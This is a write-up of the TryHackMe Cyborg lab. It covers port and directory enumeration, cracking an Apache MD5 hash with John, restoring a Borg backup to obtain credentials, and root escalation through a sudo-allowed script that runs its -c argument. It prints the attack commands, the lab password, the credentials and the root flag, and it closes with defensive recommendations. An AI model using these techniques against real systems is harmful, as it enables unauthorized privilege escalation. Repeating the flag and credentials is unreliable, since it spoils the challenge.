---
description: An evidence-based walkthrough of the TryHackMe Cyborg room.
---

# Cyborg Write-up

## Cyborg Write-up

### Challenge information

* **Platform:** TryHackMe
* **Room:** Cyborg
* **Room URL:** [https://tryhackme.com/room/cyborgt8](https://tryhackme.com/room/cyborgt8)
* **Target:** `10.114.157.235`
* **Scope:** Authorized TryHackMe lab environment

### Overview

This write-up documents the recorded route to root access on Cyborg. The investigation began with SSH and HTTP discovery, then identified web directories, recovered an Apache MD5-style archive password, and used credentials for access as `alex`.

Privilege escalation came from a passwordless sudo rule. The allowed backup script executed data supplied through its `-c` option. Running `/bin/bash` through that option produced a root shell.

The Borg recovery steps were reconstructed from public Cyborg solution references. They are identified separately from the recorded terminal evidence.

### Table of contents

* [Tools used](cyborg-write-up.md#tools-used)
* [Initial reconnaissance](cyborg-write-up.md#initial-reconnaissance)
* [Web enumeration](cyborg-write-up.md#web-enumeration)
* [Archive-password recovery](cyborg-write-up.md#archive-password-recovery)
* [Borg backup restoration](cyborg-write-up.md#borg-backup-restoration)
* [Access as alex](cyborg-write-up.md#access-as-alex)
* [Sudo enumeration](cyborg-write-up.md#sudo-enumeration)
* [Privilege escalation](cyborg-write-up.md#privilege-escalation)
* [Root verification and flag](cyborg-write-up.md#root-verification-and-flag)
* [Attack chain](cyborg-write-up.md#attack-chain)
* [Vulnerability analysis](cyborg-write-up.md#vulnerability-analysis)
* [Defensive recommendations](cyborg-write-up.md#defensive-recommendations)
* [Evidence integrity and limitations](cyborg-write-up.md#evidence-integrity-and-limitations)
* [Final summary](cyborg-write-up.md#final-summary)

### Tools used

* Nmap
* Gobuster
* John the Ripper
* BorgBackup
* SSH
* `sudo`
* Linux command-line utilities

### Initial reconnaissance

The recorded scan targeted the lab host:

```bash
nmap --top-ports 1000 -sS 10.114.157.235 -open
```

Observed output:

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-19 06:55 -0400
Nmap scan report for 10.114.157.235
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.49 seconds
```

The scan established SSH and HTTP as the initial exposed services. HTTP became the first enumeration target because web applications often expose files, routes, or credentials unavailable from the visible site.

> **Verification note:** The recorded command uses `-open`. This write-up preserves it verbatim. Confirm the intended Nmap option before relying on this syntax in a new session.

### Web enumeration

Directory enumeration was performed against the HTTP service:

```bash
gobuster dir -u http://10.114.157.235 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Observed output excerpt:

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.114.157.235
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin                (Status: 301) [Size: 316] [--> http://10.114.157.235/admin/]
etc                  (Status: 301) [Size: 314] [--> http://10.114.157.235/etc/]
Progress: 1829 / 220559
```

A `301` response indicates that the server recognized the requested resource and redirected the client, commonly to its slash-terminated directory form. The discovered `/admin/` and `/etc/` paths justified further inspection.

The supplied evidence does not include the requests, files, or page content examined after these paths were discovered. This write-up therefore does not attribute later artifacts to a specific endpoint.

### Archive-password recovery

A password hash was saved to a local file:

```bash
echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > music_archive_password
```

The `$apr1$` prefix identifies an Apache MD5-style password hash. It is a password-verification value, not plaintext. The notes do not record where this hash was found.

John the Ripper was run with the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt music_archive_password
```

Observed output:

```
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)
1g 0:00:00:00 DONE (2026-10-19 07:02) 9.090g/s 356072p/s 356072c/s 356072C/s 112806..lilica
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`rockyou.txt` contains common leaked passwords. It is useful for testing whether a hash protects a weak password. John recovered `squidward`.

John warned that the input could match more than one similar hash format. It loaded the hash as `md5crypt` and completed successfully. The recovered value is established only as the password for this hash or archive-related stage. It is not, by itself, proof of an SSH or Linux account password.

### Borg backup restoration

The notes identify Borg as the backup-restoration mechanism:

```
restore backup use borg
```

BorgBackup stores deduplicated archives and can encrypt repository contents. A password may be required to inspect encrypted archives or extract their files.

#### Reconstructed recovery path

The following path completes the missing terminal notes. It is reconstructed from public Cyborg solution references, not from the recorded session output.

The archive retrieved from the web service was extracted:

```bash
tar -xf archive.tar
cd home/field/dev/final_archive
```

The `final_archive` directory is the Borg repository. Listing it identifies the available archive:

```bash
borg list .
```

At the Borg passphrase prompt, enter the recovered value:

```
squidward
```

The archive is named `music_archive`. It can be restored into the current directory:

```bash
borg extract ./::music_archive
```

Here, `.` identifies the local Borg repository and `::music_archive` selects the archive to extract. Borg recreates the archived directory structure beneath the current working directory.

The restored files include Alex's note:

```bash
cat home/alex/Documents/note.txt
```

That note supplies the credential pair used for the next stage:

```
alex:S3cretP@s3
```

### Access as alex

The following credential pair was recorded:

```
alex:S3cretP@s3
```

A shell prompt confirmed access as `alex`:

```
alex@ubuntu:~$
```

This supports successful access as the `alex` user. The restored Borg note connects the recovered backup contents to this credential pair. The exact SSH command and authentication method were not captured in the notes.

### Sudo enumeration

The current user's sudo permissions were inspected:

```bash
sudo -l
```

Observed output:

```
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

`sudo -l` lists the commands the current user may run through sudo. The `NOPASSWD` tag allowed `alex` to execute `/etc/mp3backups/backup.sh` without another password prompt. A root-executed script with user-controlled behavior is a high-value escalation target.

### Privilege escalation

The allowed script was reviewed:

```bash
cat /etc/mp3backups/backup.sh
```

Observed script:

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
 #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
 #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
  case "${flag}" in
   c) command=${OPTARG};;
  esac
done

backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

The `getopts c:` expression accepts a value supplied with `-c`. The script assigns that value to `command`:

```bash
c) command=${OPTARG};;
```

It later executes that value through command substitution:

```bash
cmd=$($command)
```

This is unsafe. The script is allowed through sudo, so user-supplied input reaches command execution with elevated privileges.

The recorded escalation command was:

```bash
sudo /etc/mp3backups/backup.sh -c /bin/bash
```

Relevant observed output:

```
find: ‘/run/user/108/gvfs’: Permission denied
/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/' from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished
```

The missing music files caused the archive operation to fail. That failure did not prevent the later `cmd=$($command)` line from executing. `/bin/bash` therefore ran in the sudo context and produced a root shell.

### Root verification and flag

The root shell was verified with `id`:

```
root@ubuntu:/root# id
uid=0(root) gid=0(root) groups=0(root)
```

The UID and GID values of zero confirm root privileges. A prompt alone is not sufficient evidence; `id` verifies the effective identity directly.

The recorded root flag came from `/root/root.txt`:

```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

A `user.txt` file was listed in Alex's home directory, but its value was not recorded. It is intentionally omitted.

### Attack chain

```mermaid
flowchart TD
    A[Port scan finds SSH and HTTP] --> B[Directory enumeration]
    B --> C[/admin/ and /etc/ discovered]
    C --> D[Apache MD5-style hash recovered]
    D --> E[John recovers squidward]
    E --> F[Restore Borg music_archive]
    F --> G[Access as alex]
    G --> H[sudo -l exposes backup.sh]
    H --> I[-c input reaches command substitution]
    I --> J[Run backup.sh with /bin/bash]
    J --> K[id confirms root]
```

### Vulnerability analysis

The recorded chain demonstrates several security weaknesses:

1. Web resources or related application content exposed a password hash, though its exact source was not recorded.
2. The recovered password was weak enough for a common wordlist attack.
3. A privileged backup script accepted user-controlled command input.
4. The `NOPASSWD` sudo rule allowed immediate execution of that script.
5. Command substitution turned the supplied input into root-level code execution.

The Borg stage may contain additional security findings, but the available notes do not establish them. It should not be described beyond the verified facts.

### Defensive recommendations

* Keep backup repositories, credentials, and password hashes out of web-accessible locations.
* Use strong, unique passwords for archives and backup repositories.
* Restrict access to backup repositories and audit restoration activity.
* Limit SSH credentials and rotate them when exposure is suspected.
* Apply least privilege to sudo rules.
* Avoid `NOPASSWD` for scripts unless there is a clear operational need.
* Never execute user-controlled arguments as commands.
* Replace `cmd=$($command)` with fixed, allowlisted program behavior.
* Validate all script inputs before use.
* Log and review privileged script execution.

### Evidence integrity and limitations

* Commands and outputs in this write-up are preserved from the recorded lab session.
* The source of the Apache MD5-style hash is not recorded.
* The Borg commands, repository path, archive name, and restored note are reconstructed from public Cyborg solution references.
* No Borg command output was supplied.
* The exact SSH command and authentication method are not recorded.
* The root flag and root `id` output are direct session evidence.
* The user-flag value is not recorded.
* The `tar` errors are retained because they occurred during the escalation command.
* No missing stage is presented as first-hand evidence.

### Final summary

Cyborg began with SSH and HTTP discovery, followed by web directory enumeration and recovery of an Apache MD5-style password. John the Ripper recovered `squidward`. The reconstructed Borg recovery path restored `music_archive` and revealed Alex's credential note.

Access as `alex` exposed a passwordless sudo rule for a backup script. The script accepted `-c` input and executed it through command substitution. Supplying `/bin/bash` produced a root shell, confirmed by `id`.
